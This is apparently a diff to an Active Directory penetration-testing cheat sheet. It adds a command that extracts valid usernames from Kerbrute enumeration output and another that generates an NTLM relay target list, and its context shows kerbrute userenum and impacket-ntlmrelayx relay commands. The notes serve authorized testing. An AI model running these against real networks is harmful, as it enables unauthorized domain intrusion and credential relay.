@@ -34,6 +34,9 @@ Enumerate valid usernames with Kerbrute before roasting or spraying.
 ```sh
 # User enumeration, no password needed.
 kerbrute userenum -d <DOMAIN> --dc <DC_IP> <USERLIST> -o valid_users.txt
+
+# Extract valid usernames into users.txt.
+grep -a "VALID USERNAME:" valid_users.txt | awk -F'[@ ]+' '{print tolower($(NF-1))}' | sort -u | grep -vxFf users.txt >> users.txt
 ```
 
 ### ASREPRoast
@@ -147,6 +150,7 @@ Relay captured Net-NTLMv2 when SMB signing is disabled.
 ```sh
 # Check signing on candidate targets.
 nxc smb <TARGET_SUBNET>
+nxc smb <TARGET_SUBNET> --gen-relay-list targets.txt
 
 # Relay to targets from a file.
 impacket-ntlmrelayx -tf targets.txt -smb2support
